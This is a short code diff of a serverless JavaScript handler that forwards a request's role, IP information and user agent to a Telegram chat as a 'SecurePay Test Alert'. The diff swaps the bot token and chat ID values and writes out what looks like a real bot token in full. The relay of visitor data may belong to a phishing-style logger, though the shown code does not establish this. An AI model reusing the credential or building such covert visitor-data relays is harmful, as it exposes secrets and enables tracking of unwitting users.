@@ -4,7 +4,6 @@ module.exports = async (req, res) => {
   }
 
   try {
-    // Ensure body is parsed safely whether Vercel passes object or string
     let body = req.body;
     if (typeof body === 'string') {
       body = JSON.parse(body);
@@ -13,10 +12,10 @@ module.exports = async (req, res) => {
     const { role, ipInfo, userAgent } = body || {};
 
     // ==========================================
-    // ⚠️ CHECK THIS: DID YOU REPLACE THESE WITH REAL VALUES?
+    // PUT YOUR TELEGRAM BOT CREDENTIALS HERE
     // ==========================================
-    const TELEGRAM_BOT_TOKEN = "8923655458";
-    const TELEGRAM_CHAT_ID = "8923655458:AAF6BG9j-hTC7N7NUE5e-IBICdDhsrJVm_M";
+    const TELEGRAM_BOT_TOKEN = "8923655458:AAF6BG9j-hTC7N7NUE5e-IBICdDhsrJVm_M";
+    const TELEGRAM_CHAT_ID = "8923655458";
     // ==========================================
 
     const messageText = `🚨 *SecurePay Test Alert*\n\n` +
